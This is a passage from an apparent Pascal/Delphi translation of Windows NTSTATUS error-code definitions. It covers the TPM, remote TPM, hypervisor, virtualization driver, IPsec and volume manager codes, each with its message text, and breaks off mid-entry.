// The RSA key creation is blocked on this TPM due to known security vulnerabilities.
//
STATUS_PCP_IFX_RSA_KEY_CREATION_BLOCKED = NTSTATUS($C029201F);

//
// MessageId: STATUS_PCP_TICKET_MISSING
//
// MessageText:
//
// A ticket required to use a key was not provided.
//
STATUS_PCP_TICKET_MISSING        = NTSTATUS($C0292020);

//
// MessageId: STATUS_PCP_RAW_POLICY_NOT_SUPPORTED
//
// MessageText:
//
// This key has a raw policy so the KSP can't authenticate against it.
//
STATUS_PCP_RAW_POLICY_NOT_SUPPORTED = NTSTATUS($C0292021);

//
// MessageId: STATUS_PCP_KEY_HANDLE_INVALIDATED
//
// MessageText:
//
// The TPM key's handle was unexpectedly invalidated due to a hardware or firmware issue.
//
STATUS_PCP_KEY_HANDLE_INVALIDATED = NTSTATUS($C0292022);

//
// MessageId: STATUS_PCP_UNSUPPORTED_PSS_SALT
//
// MessageText:
//
// The requested salt size for signing with RSAPSS does not match what the TPM uses.
//
STATUS_PCP_UNSUPPORTED_PSS_SALT  = NTSTATUS($40292023);


//
// Remote TPM Error Codes
//

//
// MessageId: STATUS_RTPM_CONTEXT_CONTINUE
//
// MessageText:
//
// The remote TPM context exchange is not complete. The context should be transported to the target and continued.
//
STATUS_RTPM_CONTEXT_CONTINUE     = NTSTATUS($00293000);

//
// MessageId: STATUS_RTPM_CONTEXT_COMPLETE
//
// MessageText:
//
// The remote TPM operation is complete.
//
STATUS_RTPM_CONTEXT_COMPLETE     = NTSTATUS($00293001);

//
// MessageId: STATUS_RTPM_NO_RESULT
//
// MessageText:
//
// No result associated with this instance exists.
//
STATUS_RTPM_NO_RESULT            = NTSTATUS($C0293002);

//
// MessageId: STATUS_RTPM_PCR_READ_INCOMPLETE
//
// MessageText:
//
// The TPM returned incomplete PCR results. This maybe due to an unsupported selection set. Attempt the read again with a different selection set.
//
STATUS_RTPM_PCR_READ_INCOMPLETE  = NTSTATUS($C0293003);

//
// MessageId: STATUS_RTPM_INVALID_CONTEXT
//
// MessageText:
//
// The rTPM context has been corrupted. The rTPM operation must be restarted.
//
STATUS_RTPM_INVALID_CONTEXT      = NTSTATUS($C0293004);

//
// MessageId: STATUS_RTPM_UNSUPPORTED_CMD
//
// MessageText:
//
// The rTPM target does not support remote processing of the specified TPM command.
//
STATUS_RTPM_UNSUPPORTED_CMD      = NTSTATUS($C0293005);


//
// Misc TPM Error Codes
//

//
// MessageId: STATUS_TPM_ZERO_EXHAUST_ENABLED
//
// MessageText:
//
// TPM related network operations are blocked as Zero Exhaust mode is enabled on client.
//
STATUS_TPM_ZERO_EXHAUST_ENABLED  = NTSTATUS($C0294000);

//
// Hypervisor error codes - changes to these codes must be reflected in HvStatus.h
//

//
// MessageId: STATUS_HV_INVALID_HYPERCALL_CODE
//
// MessageText:
//
// The hypervisor does not support the operation because the specified hypercall code is not supported.
//
STATUS_HV_INVALID_HYPERCALL_CODE = NTSTATUS($C0350002);

//
// MessageId: STATUS_HV_INVALID_HYPERCALL_INPUT
//
// MessageText:
//
// The hypervisor does not support the operation because the encoding for the hypercall input register is not supported.
//
STATUS_HV_INVALID_HYPERCALL_INPUT = NTSTATUS($C0350003);

//
// MessageId: STATUS_HV_INVALID_ALIGNMENT
//
// MessageText:
//
// The hypervisor could not perform the operation because a parameter has an invalid alignment.
//
STATUS_HV_INVALID_ALIGNMENT      = NTSTATUS($C0350004);

//
// MessageId: STATUS_HV_INVALID_PARAMETER
//
// MessageText:
//
// The hypervisor could not perform the operation because an invalid parameter was specified.
//
STATUS_HV_INVALID_PARAMETER      = NTSTATUS($C0350005);

//
// MessageId: STATUS_HV_ACCESS_DENIED
//
// MessageText:
//
// Access to the specified object was denied.
//
STATUS_HV_ACCESS_DENIED          = NTSTATUS($C0350006);

//
// MessageId: STATUS_HV_INVALID_PARTITION_STATE
//
// MessageText:
//
// The hypervisor could not perform the operation because the partition is entering or in an invalid state.
//
STATUS_HV_INVALID_PARTITION_STATE = NTSTATUS($C0350007);

//
// MessageId: STATUS_HV_OPERATION_DENIED
//
// MessageText:
//
// The operation is not allowed in the current state.
//
STATUS_HV_OPERATION_DENIED       = NTSTATUS($C0350008);

//
// MessageId: STATUS_HV_UNKNOWN_PROPERTY
//
// MessageText:
//
// The hypervisor does not recognize the specified partition property.
//
STATUS_HV_UNKNOWN_PROPERTY       = NTSTATUS($C0350009);

//
// MessageId: STATUS_HV_PROPERTY_VALUE_OUT_OF_RANGE
//
// MessageText:
//
// The specified value of a partition property is out of range or violates an invariant.
//
STATUS_HV_PROPERTY_VALUE_OUT_OF_RANGE = NTSTATUS($C035000A);

//
// MessageId: STATUS_HV_INSUFFICIENT_MEMORY
//
// MessageText:
//
// There is not enough memory in the hypervisor pool to complete the operation.
//
STATUS_HV_INSUFFICIENT_MEMORY    = NTSTATUS($C035000B);

//
// MessageId: STATUS_HV_PARTITION_TOO_DEEP
//
// MessageText:
//
// The maximum partition depth has been exceeded for the partition hierarchy.
//
STATUS_HV_PARTITION_TOO_DEEP     = NTSTATUS($C035000C);

//
// MessageId: STATUS_HV_INVALID_PARTITION_ID
//
// MessageText:
//
// A partition with the specified partition Id does not exist.
//
STATUS_HV_INVALID_PARTITION_ID   = NTSTATUS($C035000D);

//
// MessageId: STATUS_HV_INVALID_VP_INDEX
//
// MessageText:
//
// The hypervisor could not perform the operation because the specified VP index is invalid.
//
STATUS_HV_INVALID_VP_INDEX       = NTSTATUS($C035000E);

//
// MessageId: STATUS_HV_INVALID_PORT_ID
//
// MessageText:
//
// The hypervisor could not perform the operation because the specified port identifier is invalid.
//
STATUS_HV_INVALID_PORT_ID        = NTSTATUS($C0350011);

//
// MessageId: STATUS_HV_INVALID_CONNECTION_ID
//
// MessageText:
//
// The hypervisor could not perform the operation because the specified connection identifier is invalid.
//
STATUS_HV_INVALID_CONNECTION_ID  = NTSTATUS($C0350012);

//
// MessageId: STATUS_HV_INSUFFICIENT_BUFFERS
//
// MessageText:
//
// Not enough buffers were supplied to send a message.
//
STATUS_HV_INSUFFICIENT_BUFFERS   = NTSTATUS($C0350013);

//
// MessageId: STATUS_HV_NOT_ACKNOWLEDGED
//
// MessageText:
//
// The previous virtual interrupt has not been acknowledged.
//
STATUS_HV_NOT_ACKNOWLEDGED       = NTSTATUS($C0350014);

//
// MessageId: STATUS_HV_INVALID_VP_STATE
//
// MessageText:
//
// A virtual processor is not in the correct state for the indicated operation.
//
STATUS_HV_INVALID_VP_STATE       = NTSTATUS($C0350015);

//
// MessageId: STATUS_HV_ACKNOWLEDGED
//
// MessageText:
//
// The previous virtual interrupt has already been acknowledged.
//
STATUS_HV_ACKNOWLEDGED           = NTSTATUS($C0350016);

//
// MessageId: STATUS_HV_INVALID_SAVE_RESTORE_STATE
//
// MessageText:
//
// The indicated partition is not in a valid state for saving or restoring.
//
STATUS_HV_INVALID_SAVE_RESTORE_STATE = NTSTATUS($C0350017);

//
// MessageId: STATUS_HV_INVALID_SYNIC_STATE
//
// MessageText:
//
// The hypervisor could not complete the operation because a required feature of the synthetic interrupt controller (SynIC) was disabled.
//
STATUS_HV_INVALID_SYNIC_STATE    = NTSTATUS($C0350018);

//
// MessageId: STATUS_HV_OBJECT_IN_USE
//
// MessageText:
//
// The hypervisor could not perform the operation because the object or value was either already in use or being used for a purpose that would not permit completing the operation.
//
STATUS_HV_OBJECT_IN_USE          = NTSTATUS($C0350019);

//
// MessageId: STATUS_HV_INVALID_PROXIMITY_DOMAIN_INFO
//
// MessageText:
//
// The proximity domain information is invalid.
//
STATUS_HV_INVALID_PROXIMITY_DOMAIN_INFO = NTSTATUS($C035001A);

//
// MessageId: STATUS_HV_NO_DATA
//
// MessageText:
//
// An attempt to retrieve debugging data failed because none was available.
//
STATUS_HV_NO_DATA                = NTSTATUS($C035001B);

//
// MessageId: STATUS_HV_INACTIVE
//
// MessageText:
//
// The physical connection being used for debugging has not recorded any receive activity since the last operation.
//
STATUS_HV_INACTIVE               = NTSTATUS($C035001C);

//
// MessageId: STATUS_HV_NO_RESOURCES
//
// MessageText:
//
// There are not enough resources to complete the operation.
//
STATUS_HV_NO_RESOURCES           = NTSTATUS($C035001D);

//
// MessageId: STATUS_HV_FEATURE_UNAVAILABLE
//
// MessageText:
//
// A hypervisor feature is not available to the user.
//
STATUS_HV_FEATURE_UNAVAILABLE    = NTSTATUS($C035001E);

//
// MessageId: STATUS_HV_INSUFFICIENT_BUFFER
//
// MessageText:
//
// The specified buffer was too small to contain all of the requested data.
//
STATUS_HV_INSUFFICIENT_BUFFER    = NTSTATUS($C0350033);

//
// MessageId: STATUS_HV_INSUFFICIENT_DEVICE_DOMAINS
//
// MessageText:
//
// The maximum number of domains supported by the platform I/O remapping hardware is currently in use. No domains are available to assign this device to this partition.
//
STATUS_HV_INSUFFICIENT_DEVICE_DOMAINS = NTSTATUS($C0350038);

//
// MessageId: STATUS_HV_CPUID_FEATURE_VALIDATION_ERROR
//
// MessageText:
//
// Validation of CPUID data of the processor failed.
//
STATUS_HV_CPUID_FEATURE_VALIDATION_ERROR = NTSTATUS($C035003C);

//
// MessageId: STATUS_HV_CPUID_XSAVE_FEATURE_VALIDATION_ERROR
//
// MessageText:
//
// Validation of XSAVE CPUID data of the processor failed.
//
STATUS_HV_CPUID_XSAVE_FEATURE_VALIDATION_ERROR = NTSTATUS($C035003D);

//
// MessageId: STATUS_HV_PROCESSOR_STARTUP_TIMEOUT
//
// MessageText:
//
// Processor did not respond within the timeout period.
//
STATUS_HV_PROCESSOR_STARTUP_TIMEOUT = NTSTATUS($C035003E);

//
// MessageId: STATUS_HV_SMX_ENABLED
//
// MessageText:
//
// SMX has been enabled in the BIOS.
//
STATUS_HV_SMX_ENABLED            = NTSTATUS($C035003F);

//
// MessageId: STATUS_HV_INVALID_LP_INDEX
//
// MessageText:
//
// The hypervisor could not perform the operation because the specified LP index is invalid.
//
STATUS_HV_INVALID_LP_INDEX       = NTSTATUS($C0350041);

//
// MessageId: STATUS_HV_INVALID_REGISTER_VALUE
//
// MessageText:
//
// The supplied register value is invalid.
//
STATUS_HV_INVALID_REGISTER_VALUE = NTSTATUS($C0350050);

//
// MessageId: STATUS_HV_INVALID_VTL_STATE
//
// MessageText:
//
// The supplied virtual trust level is not in the correct state to perform the requested operation.
//
STATUS_HV_INVALID_VTL_STATE      = NTSTATUS($C0350051);

//
// MessageId: STATUS_HV_NX_NOT_DETECTED
//
// MessageText:
//
// No execute feature (NX) is not present or not enabled in the BIOS.
//
STATUS_HV_NX_NOT_DETECTED        = NTSTATUS($C0350055);

//
// MessageId: STATUS_HV_INVALID_DEVICE_ID
//
// MessageText:
//
// The supplied device ID is invalid.
//
STATUS_HV_INVALID_DEVICE_ID      = NTSTATUS($C0350057);

//
// MessageId: STATUS_HV_INVALID_DEVICE_STATE
//
// MessageText:
//
// The operation is not allowed in the current device state.
//
STATUS_HV_INVALID_DEVICE_STATE   = NTSTATUS($C0350058);

//
// MessageId: STATUS_HV_PENDING_PAGE_REQUESTS
//
// MessageText:
//
// The device had pending page requests which were discarded.
//
STATUS_HV_PENDING_PAGE_REQUESTS  = NTSTATUS($00350059);

//
// MessageId: STATUS_HV_PAGE_REQUEST_INVALID
//
// MessageText:
//
// The supplied page request specifies a memory access that the guest does not have permissions to perform.
//
STATUS_HV_PAGE_REQUEST_INVALID   = NTSTATUS($C0350060);

//
// MessageId: STATUS_HV_INVALID_CPU_GROUP_ID
//
// MessageText:
//
// A CPU group with the specified CPU group Id does not exist.
//
STATUS_HV_INVALID_CPU_GROUP_ID   = NTSTATUS($C035006F);

//
// MessageId: STATUS_HV_INVALID_CPU_GROUP_STATE
//
// MessageText:
//
// The hypervisor could not perform the operation because the CPU group is entering or in an invalid state.
//
STATUS_HV_INVALID_CPU_GROUP_STATE = NTSTATUS($C0350070);

//
// MessageId: STATUS_HV_OPERATION_FAILED
//
// MessageText:
//
// The requested operation failed.
//
STATUS_HV_OPERATION_FAILED       = NTSTATUS($C0350071);

//
// MessageId: STATUS_HV_NOT_ALLOWED_WITH_NESTED_VIRT_ACTIVE
//
// MessageText:
//
// The hypervisor could not perform the operation because it is not allowed with nested virtualization active.
//
STATUS_HV_NOT_ALLOWED_WITH_NESTED_VIRT_ACTIVE = NTSTATUS($C0350072);

//
// MessageId: STATUS_HV_INSUFFICIENT_ROOT_MEMORY
//
// MessageText:
//
// There is not enough memory in the root partition's pool to complete the operation.
//
STATUS_HV_INSUFFICIENT_ROOT_MEMORY = NTSTATUS($C0350073);

//
// MessageId: STATUS_HV_EVENT_BUFFER_ALREADY_FREED
//
// MessageText:
//
// The provided event log buffer was already marked as freed.
//
STATUS_HV_EVENT_BUFFER_ALREADY_FREED = NTSTATUS($C0350074);

//
// MessageId: STATUS_HV_INSUFFICIENT_CONTIGUOUS_MEMORY
//
// MessageText:
//
// There is not enough contiguous memory in the partition's pool to complete the operation.
//
STATUS_HV_INSUFFICIENT_CONTIGUOUS_MEMORY = NTSTATUS($C0350075);

//
// MessageId: STATUS_HV_NOT_PRESENT
//
// MessageText:
//
// No hypervisor is present on this system.
//
STATUS_HV_NOT_PRESENT            = NTSTATUS($C0351000);

//
// Virtualization status codes - these codes are used by the Virtualization Infrastructure Driver (VID) and other components
//                               of the virtualization stack.
//
//
// Errors:
//

//
// MessageId: STATUS_VID_DUPLICATE_HANDLER
//
// MessageText:
//
// The handler for the virtualization infrastructure driver is already registered. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_DUPLICATE_HANDLER     = NTSTATUS($C0370001);

//
// MessageId: STATUS_VID_TOO_MANY_HANDLERS
//
// MessageText:
//
// The number of registered handlers for the virtualization infrastructure driver exceeded the maximum. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_TOO_MANY_HANDLERS     = NTSTATUS($C0370002);

//
// MessageId: STATUS_VID_QUEUE_FULL
//
// MessageText:
//
// The message queue for the virtualization infrastructure driver is full and cannot accept new messages. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_QUEUE_FULL            = NTSTATUS($C0370003);

//
// MessageId: STATUS_VID_HANDLER_NOT_PRESENT
//
// MessageText:
//
// No handler exists to handle the message for the virtualization infrastructure driver. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_HANDLER_NOT_PRESENT   = NTSTATUS($C0370004);

//
// MessageId: STATUS_VID_INVALID_OBJECT_NAME
//
// MessageText:
//
// The name of the partition or message queue for the virtualization infrastructure driver is invalid. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_INVALID_OBJECT_NAME   = NTSTATUS($C0370005);

//
// MessageId: STATUS_VID_PARTITION_NAME_TOO_LONG
//
// MessageText:
//
// The partition name of the virtualization infrastructure driver exceeds the maximum.
//
STATUS_VID_PARTITION_NAME_TOO_LONG = NTSTATUS($C0370006);

//
// MessageId: STATUS_VID_MESSAGE_QUEUE_NAME_TOO_LONG
//
// MessageText:
//
// The message queue name of the virtualization infrastructure driver exceeds the maximum.
//
STATUS_VID_MESSAGE_QUEUE_NAME_TOO_LONG = NTSTATUS($C0370007);

//
// MessageId: STATUS_VID_PARTITION_ALREADY_EXISTS
//
// MessageText:
//
// Cannot create the partition for the virtualization infrastructure driver because another partition with the same name already exists.
//
STATUS_VID_PARTITION_ALREADY_EXISTS = NTSTATUS($C0370008);

//
// MessageId: STATUS_VID_PARTITION_DOES_NOT_EXIST
//
// MessageText:
//
// The virtualization infrastructure driver has encountered an error. The requested partition does not exist. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_PARTITION_DOES_NOT_EXIST = NTSTATUS($C0370009);

//
// MessageId: STATUS_VID_PARTITION_NAME_NOT_FOUND
//
// MessageText:
//
// The virtualization infrastructure driver has encountered an error. Could not find the requested partition. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_PARTITION_NAME_NOT_FOUND = NTSTATUS($C037000A);

//
// MessageId: STATUS_VID_MESSAGE_QUEUE_ALREADY_EXISTS
//
// MessageText:
//
// A message queue with the same name already exists for the virtualization infrastructure driver.
//
STATUS_VID_MESSAGE_QUEUE_ALREADY_EXISTS = NTSTATUS($C037000B);

//
// MessageId: STATUS_VID_EXCEEDED_MBP_ENTRY_MAP_LIMIT
//
// MessageText:
//
// The memory block page for the virtualization infrastructure driver cannot be mapped because the page map limit has been reached. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_EXCEEDED_MBP_ENTRY_MAP_LIMIT = NTSTATUS($C037000C);

//
// MessageId: STATUS_VID_MB_STILL_REFERENCED
//
// MessageText:
//
// The memory block for the virtualization infrastructure driver is still being used and cannot be destroyed.
//
STATUS_VID_MB_STILL_REFERENCED   = NTSTATUS($C037000D);

//
// MessageId: STATUS_VID_CHILD_GPA_PAGE_SET_CORRUPTED
//
// MessageText:
//
// Cannot unlock the page array for the guest operating system memory address because it does not match a previous lock request. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_CHILD_GPA_PAGE_SET_CORRUPTED = NTSTATUS($C037000E);

//
// MessageId: STATUS_VID_INVALID_NUMA_SETTINGS
//
// MessageText:
//
// The non-uniform memory access (NUMA) node settings do not match the system NUMA topology. In order to start the virtual machine, you will need to modify the NUMA configuration.
//
STATUS_VID_INVALID_NUMA_SETTINGS = NTSTATUS($C037000F);

//
// MessageId: STATUS_VID_INVALID_NUMA_NODE_INDEX
//
// MessageText:
//
// The non-uniform memory access (NUMA) node index does not match a valid index in the system NUMA topology.
//
STATUS_VID_INVALID_NUMA_NODE_INDEX = NTSTATUS($C0370010);

//
// MessageId: STATUS_VID_NOTIFICATION_QUEUE_ALREADY_ASSOCIATED
//
// MessageText:
//
// The memory block for the virtualization infrastructure driver is already associated with a message queue.
//
STATUS_VID_NOTIFICATION_QUEUE_ALREADY_ASSOCIATED = NTSTATUS($C0370011);

//
// MessageId: STATUS_VID_INVALID_MEMORY_BLOCK_HANDLE
//
// MessageText:
//
// The handle is not a valid memory block handle for the virtualization infrastructure driver.
//
STATUS_VID_INVALID_MEMORY_BLOCK_HANDLE = NTSTATUS($C0370012);

//
// MessageId: STATUS_VID_PAGE_RANGE_OVERFLOW
//
// MessageText:
//
// The request exceeded the memory block page limit for the virtualization infrastructure driver. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_PAGE_RANGE_OVERFLOW   = NTSTATUS($C0370013);

//
// MessageId: STATUS_VID_INVALID_MESSAGE_QUEUE_HANDLE
//
// MessageText:
//
// The handle is not a valid message queue handle for the virtualization infrastructure driver.
//
STATUS_VID_INVALID_MESSAGE_QUEUE_HANDLE = NTSTATUS($C0370014);

//
// MessageId: STATUS_VID_INVALID_GPA_RANGE_HANDLE
//
// MessageText:
//
// The handle is not a valid page range handle for the virtualization infrastructure driver.
//
STATUS_VID_INVALID_GPA_RANGE_HANDLE = NTSTATUS($C0370015);

//
// MessageId: STATUS_VID_NO_MEMORY_BLOCK_NOTIFICATION_QUEUE
//
// MessageText:
//
// Cannot install client notifications because no message queue for the virtualization infrastructure driver is associated with the memory block.
//
STATUS_VID_NO_MEMORY_BLOCK_NOTIFICATION_QUEUE = NTSTATUS($C0370016);

//
// MessageId: STATUS_VID_MEMORY_BLOCK_LOCK_COUNT_EXCEEDED
//
// MessageText:
//
// The request to lock or map a memory block page failed because the virtualization infrastructure driver memory block limit has been reached. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
//
//
STATUS_VID_MEMORY_BLOCK_LOCK_COUNT_EXCEEDED = NTSTATUS($C0370017);

//
// MessageId: STATUS_VID_INVALID_PPM_HANDLE
//
// MessageText:
//
// The handle is not a valid parent partition mapping handle for the virtualization infrastructure driver.
//
STATUS_VID_INVALID_PPM_HANDLE    = NTSTATUS($C0370018);

//
// MessageId: STATUS_VID_MBPS_ARE_LOCKED
//
// MessageText:
//
// Notifications cannot be created on the memory block because it is use.
//
STATUS_VID_MBPS_ARE_LOCKED       = NTSTATUS($C0370019);

//
// MessageId: STATUS_VID_MESSAGE_QUEUE_CLOSED
//
// MessageText:
//
// The message queue for the virtualization infrastructure driver has been closed. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_MESSAGE_QUEUE_CLOSED  = NTSTATUS($C037001A);

//
// MessageId: STATUS_VID_VIRTUAL_PROCESSOR_LIMIT_EXCEEDED
//
// MessageText:
//
// Cannot add a virtual processor to the partition because the maximum has been reached.
//
STATUS_VID_VIRTUAL_PROCESSOR_LIMIT_EXCEEDED = NTSTATUS($C037001B);

//
// MessageId: STATUS_VID_STOP_PENDING
//
// MessageText:
//
// Cannot stop the virtual processor immediately because of a pending intercept.
//
STATUS_VID_STOP_PENDING          = NTSTATUS($C037001C);

//
// MessageId: STATUS_VID_INVALID_PROCESSOR_STATE
//
// MessageText:
//
// Invalid state for the virtual processor. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_INVALID_PROCESSOR_STATE = NTSTATUS($C037001D);

//
// MessageId: STATUS_VID_EXCEEDED_KM_CONTEXT_COUNT_LIMIT
//
// MessageText:
//
// The maximum number of kernel mode clients for the virtualization infrastructure driver has been reached. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_EXCEEDED_KM_CONTEXT_COUNT_LIMIT = NTSTATUS($C037001E);

//
// MessageId: STATUS_VID_KM_INTERFACE_ALREADY_INITIALIZED
//
// MessageText:
//
// This kernel mode interface for the virtualization infrastructure driver has already been initialized. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_KM_INTERFACE_ALREADY_INITIALIZED = NTSTATUS($C037001F);

//
// MessageId: STATUS_VID_MB_PROPERTY_ALREADY_SET_RESET
//
// MessageText:
//
// Cannot set or reset the memory block property more than once for the virtualization infrastructure driver. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_MB_PROPERTY_ALREADY_SET_RESET = NTSTATUS($C0370020);

//
// MessageId: STATUS_VID_MMIO_RANGE_DESTROYED
//
// MessageText:
//
// The memory mapped I/O for this page range no longer exists. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_MMIO_RANGE_DESTROYED  = NTSTATUS($C0370021);

//
// MessageId: STATUS_VID_INVALID_CHILD_GPA_PAGE_SET
//
// MessageText:
//
// The lock or unlock request uses an invalid guest operating system memory address. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_INVALID_CHILD_GPA_PAGE_SET = NTSTATUS($C0370022);

//
// MessageId: STATUS_VID_RESERVE_PAGE_SET_IS_BEING_USED
//
// MessageText:
//
// Cannot destroy or reuse the reserve page set for the virtualization infrastructure driver because it is in use. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_RESERVE_PAGE_SET_IS_BEING_USED = NTSTATUS($C0370023);

//
// MessageId: STATUS_VID_RESERVE_PAGE_SET_TOO_SMALL
//
// MessageText:
//
// The reserve page set for the virtualization infrastructure driver is too small to use in the lock request. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_RESERVE_PAGE_SET_TOO_SMALL = NTSTATUS($C0370024);

//
// MessageId: STATUS_VID_MBP_ALREADY_LOCKED_USING_RESERVED_PAGE
//
// MessageText:
//
// Cannot lock or map the memory block page for the virtualization infrastructure driver because it has already been locked using a reserve page set page. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_MBP_ALREADY_LOCKED_USING_RESERVED_PAGE = NTSTATUS($C0370025);

//
// MessageId: STATUS_VID_MBP_COUNT_EXCEEDED_LIMIT
//
// MessageText:
//
// Cannot create the memory block for the virtualization infrastructure driver because the requested number of pages exceeded the limit. Restarting the virtual machine may fix the problem. If the problem persists, try restarting the physical computer.
//
STATUS_VID_MBP_COUNT_EXCEEDED_LIMIT = NTSTATUS($C0370026);

//
// MessageId: STATUS_VID_SAVED_STATE_CORRUPT
//
// MessageText:
//
// Cannot restore this virtual machine because the saved state data cannot be read. Delete the saved state data and then try to start the virtual machine.
//
STATUS_VID_SAVED_STATE_CORRUPT   = NTSTATUS($C0370027);

//
// MessageId: STATUS_VID_SAVED_STATE_UNRECOGNIZED_ITEM
//
// MessageText:
//
// Cannot restore this virtual machine because an item read from the saved state data is not recognized. Delete the saved state data and then try to start the virtual machine.
//
STATUS_VID_SAVED_STATE_UNRECOGNIZED_ITEM = NTSTATUS($C0370028);

//
// MessageId: STATUS_VID_SAVED_STATE_INCOMPATIBLE
//
// MessageText:
//
// Cannot restore this virtual machine to the saved state because of hypervisor incompatibility. Delete the saved state data and then try to start the virtual machine.
//
STATUS_VID_SAVED_STATE_INCOMPATIBLE = NTSTATUS($C0370029);

//
// MessageId: STATUS_VID_VTL_ACCESS_DENIED
//
// MessageText:
//
// The specified VTL does not have the permission to access the resource.
//
STATUS_VID_VTL_ACCESS_DENIED     = NTSTATUS($C037002A);

//
// Warnings:
//
//
// MessageId: STATUS_VID_REMOTE_NODE_PARENT_GPA_PAGES_USED
//
// MessageText:
//
// A virtual machine is running with its memory allocated across multiple NUMA nodes. This does not indicate a problem unless the performance of your virtual machine is unusually slow. If you are experiencing performance problems, you may need to modify the NUMA configuration.
//
STATUS_VID_REMOTE_NODE_PARENT_GPA_PAGES_USED = NTSTATUS($80370001);


//
// IPSEC error codes (tcpip.sys)
//

//
// MessageId: STATUS_IPSEC_BAD_SPI
//
// MessageText:
//
// The SPI in the packet does not match a valid IPsec SA.
//
STATUS_IPSEC_BAD_SPI             = NTSTATUS($C0360001);

//
// MessageId: STATUS_IPSEC_SA_LIFETIME_EXPIRED
//
// MessageText:
//
// Packet was received on an IPsec SA whose lifetime has expired.
//
STATUS_IPSEC_SA_LIFETIME_EXPIRED = NTSTATUS($C0360002);

//
// MessageId: STATUS_IPSEC_WRONG_SA
//
// MessageText:
//
// Packet was received on an IPsec SA that does not match the packet characteristics.
//
STATUS_IPSEC_WRONG_SA            = NTSTATUS($C0360003);

//
// MessageId: STATUS_IPSEC_REPLAY_CHECK_FAILED
//
// MessageText:
//
// Packet sequence number replay check failed.
//
STATUS_IPSEC_REPLAY_CHECK_FAILED = NTSTATUS($C0360004);

//
// MessageId: STATUS_IPSEC_INVALID_PACKET
//
// MessageText:
//
// IPsec header and/or trailer in the packet is invalid.
//
STATUS_IPSEC_INVALID_PACKET      = NTSTATUS($C0360005);

//
// MessageId: STATUS_IPSEC_INTEGRITY_CHECK_FAILED
//
// MessageText:
//
// IPsec integrity check failed.
//
STATUS_IPSEC_INTEGRITY_CHECK_FAILED = NTSTATUS($C0360006);

//
// MessageId: STATUS_IPSEC_CLEAR_TEXT_DROP
//
// MessageText:
//
// IPsec dropped a clear text packet.
//
STATUS_IPSEC_CLEAR_TEXT_DROP     = NTSTATUS($C0360007);

//
// MessageId: STATUS_IPSEC_AUTH_FIREWALL_DROP
//
// MessageText:
//
// IPsec dropped an incoming ESP packet in authenticated firewall mode. This drop is benign.
//
STATUS_IPSEC_AUTH_FIREWALL_DROP  = NTSTATUS($C0360008);

//
// MessageId: STATUS_IPSEC_THROTTLE_DROP
//
// MessageText:
//
// IPsec dropped a packet due to DoS throttling.
//
STATUS_IPSEC_THROTTLE_DROP       = NTSTATUS($C0360009);

//
// MessageId: STATUS_IPSEC_DOSP_BLOCK
//
// MessageText:
//
// IPsec DoS Protection matched an explicit block rule.
//
STATUS_IPSEC_DOSP_BLOCK          = NTSTATUS($C0368000);

//
// MessageId: STATUS_IPSEC_DOSP_RECEIVED_MULTICAST
//
// MessageText:
//
// IPsec DoS Protection received an IPsec specific multicast packet which is not allowed.
//
STATUS_IPSEC_DOSP_RECEIVED_MULTICAST = NTSTATUS($C0368001);

//
// MessageId: STATUS_IPSEC_DOSP_INVALID_PACKET
//
// MessageText:
//
// IPsec DoS Protection received an incorrectly formatted packet.
//
STATUS_IPSEC_DOSP_INVALID_PACKET = NTSTATUS($C0368002);

//
// MessageId: STATUS_IPSEC_DOSP_STATE_LOOKUP_FAILED
//
// MessageText:
//
// IPsec DoS Protection failed to look up state.
//
STATUS_IPSEC_DOSP_STATE_LOOKUP_FAILED = NTSTATUS($C0368003);

//
// MessageId: STATUS_IPSEC_DOSP_MAX_ENTRIES
//
// MessageText:
//
// IPsec DoS Protection failed to create state because the maximum number of entries allowed by policy has been reached.
//
STATUS_IPSEC_DOSP_MAX_ENTRIES    = NTSTATUS($C0368004);

//
// MessageId: STATUS_IPSEC_DOSP_KEYMOD_NOT_ALLOWED
//
// MessageText:
//
// IPsec DoS Protection received an IPsec negotiation packet for a keying module which is not allowed by policy.
//
STATUS_IPSEC_DOSP_KEYMOD_NOT_ALLOWED = NTSTATUS($C0368005);

//
// MessageId: STATUS_IPSEC_DOSP_MAX_PER_IP_RATELIMIT_QUEUES
//
// MessageText:
//
// IPsec DoS Protection failed to create a per internal IP rate limit queue because the maximum number of queues allowed by policy has been reached.
//
STATUS_IPSEC_DOSP_MAX_PER_IP_RATELIMIT_QUEUES = NTSTATUS($C0368006);


//
// Volume manager status codes (volmgr.sys and volmgrx.sys)
//

//
// WARNINGS
//
//
// MessageId: STATUS_VOLMGR_INCOMPLETE_REGENERATION
//
// MessageText:
//
// The regeneration operation was not able to copy all data from the active plexes due to bad sectors.
//
STATUS_VOLMGR_INCOMPLETE_REGENERATION = NTSTATUS($80380001);

//
// MessageId: STATUS_VOLMGR_INCOMPLETE_DISK_MIGRATION
//
// MessageText:
//
